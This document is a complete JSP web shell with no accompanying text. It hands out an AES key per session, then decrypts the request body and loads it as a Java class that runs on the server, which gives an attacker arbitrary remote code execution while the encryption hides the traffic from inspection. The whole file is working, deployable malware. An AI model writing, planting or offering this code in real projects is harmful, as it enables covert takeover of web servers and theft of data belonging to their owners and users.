<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%>
<%!class U extends ClassLoader{U(ClassLoader c){super(c);}
public Class g(byte []b){return super.defineClass(b,0,b.length);}}%>
<%if(request.getParameter("pass")!=null){String k=(""+UUID.randomUUID()).replace("-","").substring(16);session.putValue("u",k);
out.print(k);return;}
Cipher c=Cipher.getInstance("AES");
c.init(2,new SecretKeySpec((session.getValue("u")+"").getBytes(),"AES"));
BASE64Decoder decoder=new sun.misc.BASE64Decoder();
new U(this.getClass().getClassLoader()).g(c.doFinal(decoder.decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);%>